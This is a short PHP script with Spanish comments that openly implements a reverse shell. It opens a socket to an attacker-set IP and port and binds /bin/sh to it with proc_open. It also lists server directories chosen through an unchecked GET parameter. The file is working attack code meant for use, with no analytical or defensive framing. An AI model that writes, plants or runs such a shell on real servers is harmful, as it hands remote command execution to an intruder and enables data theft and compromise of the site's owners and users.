<?php
// Configuración del reverse shell
$ip = '192.168.1.10'; // Cambia esto por tu dirección IP
$port = 1234;        // Cambia esto por tu puerto

// Intentar establecer una conexión de reverse shell
$sock = fsockopen($ip, $port);
$proc = proc_open('/bin/sh', array(0 => $sock, 1 => $sock, 2 => $sock), $pipes);

// Navegación de directorios
if (isset($_GET['dir'])) {
    // Cambiar al directorio especificado
    chdir($_GET['dir']);
}

// Obtener el directorio actual
$current_dir = getcwd();

// Listar archivos y directorios en el directorio actual
$files = scandir($current_dir);

// Mostrar los archivos y directorios
echo "Directorio actual: " . $current_dir . "\n";
echo "Archivos y directorios:\n";
foreach ($files as $file) {
    echo $file . "\n";
}

// Mantener el shell abierto
while (feof($sock) === false) {
    fwrite($sock, fread($sock, 2048));
}
fclose($sock);
proc_close($proc);
?>
